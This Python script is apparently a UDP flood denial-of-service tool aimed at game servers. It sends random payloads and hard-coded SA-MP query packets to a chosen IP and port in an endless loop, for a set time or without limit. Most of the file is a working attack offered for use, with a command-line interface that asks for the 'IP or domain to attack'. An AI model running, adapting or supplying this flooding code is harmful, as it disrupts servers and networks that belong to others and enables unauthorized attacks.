from time import time as tt
from time import sleep
import argparse
import codecs
import socket
import random
import threading
import string
import struct
import os
import sys
import platform
import getpass
import signal
import subprocess
import distro
import csv

Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]

RELEASE_DATA = {}
with open("/etc/os-release") as f:
    reader = csv.reader(f, delimiter="=")
    for row in reader:
        if row:
            RELEASE_DATA[row[0]] = row[1]
if RELEASE_DATA["ID"] in ["debian"]:
    with open("/etc/debian_version") as f:
        DEBIAN_VERSION = f.readline().strip()
    version_split = RELEASE_DATA["VERSION"]

system = platform.uname()[0]
nick = os.getlogin()
hostnm = socket.gethostname()
IPAddr = socket.gethostbyname(hostnm)
ver = platform.system()
rel = platform.version()
bit = platform.machine()
operating_sys = platform.system()
def check_ping():
    hostname = IPAddr
    response = os.system("ping -c 1 " + hostname)
    # and then check the response...
    if response == 0:
        pingstatus = "ESTABILISHED"
    else:
        pingstatus = "UNESTABILISHED"
    
    return pingstatus
cont = check_ping()
def title2():
    if system == 'Linux':
      os.system("printf '\033]2;Connected As [%s@%s] Device [%s] Your Connection Is [%s]\a'"%(nick,hostnm,RELEASE_DATA["NAME"],cont))
    elif system == 'Windows':
        os.system("title Connected As [%s@%s] Device [%s %s] Your Connection Is [%s]"%(nick,hostnm,ver,bit,cont))
    else:
         print("\nPlease, Run This programm on Linux, Windows or MacOS!\n")
         sys.exit()           
def cls():
    if system == 'Windows':
      os.system("cls")
    elif system == 'Linux':
        os.system("clear")
    else:
         print("\nPlease, Run This programm on Linux, Windows or MacOS!\n")
         sys.exit()

cls()
title2()
def attack(ip, port, time, size):

    if time is None:
            time = float('inf')

    if port is not None:
            port = max(1, min(65535, port))

    fmt = 'Tok... Tok... Tok... Paket Paket Dari justbwnn Menyerang {ip} {port} '.format(
            ip='IP {ip}'.format(ip=ip),
            port='Port {port}'.format(port=port) if port else 'random ports',
            time='{time} seconds'.format(time=time) if str(time).isdigit() else 'unlimited time',
            size=size
    )
    sleep(0.5)
    print(fmt)
    sleep(0.5)
    print(fmt)
    sleep(0.5)
    print(fmt)
    sleep(0.5)
    print(fmt)
    sleep(0.5)
    print(fmt)
    sleep(0.5)
    print(fmt)
    sleep(0.5)
    print(fmt)
    sleep(0.5)
    print(fmt)
    sleep(0.5)
    print(fmt)
    sleep(0.5)
    print(fmt)
    sleep(0.5)
    print(fmt)
    sleep(0.5)
    print(fmt)
    sleep(0.5)
    print(fmt)

    startup = tt()
    size = random._urandom(1024)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break
        sock.sendto(size, (ip, port))
        msg = Pacotes[random.randrange(0,3)]
                     
        sock.sendto(msg, (ip, int(port)))
                
                
        if(int(port) == 7777):
            sock.sendto(Pacotes[5], (ip, int(port)))
        elif(int(port) == 7796):
            sock.sendto(Pacotes[4], (ip, int(port)))
        elif(int(port) == 7771):
            sock.sendto(Pacotes[6], (ip, int(port)))
        elif(int(port) == 7784):
            sock.sendto(Pacotes[7], (ip, int(port)))

    print('Attack finished.')

if __name__ == '__main__':
    
        parser = argparse.ArgumentParser(description='Usage: python ud.py <ip> <port> <time> <size>')
    
        parser.add_argument('ip', type=str, help='IP or domain to attack.')
        parser.add_argument('-p', '--port', type=int, default=7777, help='Port number.')
        parser.add_argument('-t', '--time', type=int, default=None, help='Time in seconds.')
        parser.add_argument('-s', '--size', type=int, default=5120, help='Size in bytes.')

        args = parser.parse_args()

        try:
            attack(args.ip, args.port, args.time, args.size)
        except KeyboardInterrupt:
            cls()
            print('Attack stopped.')
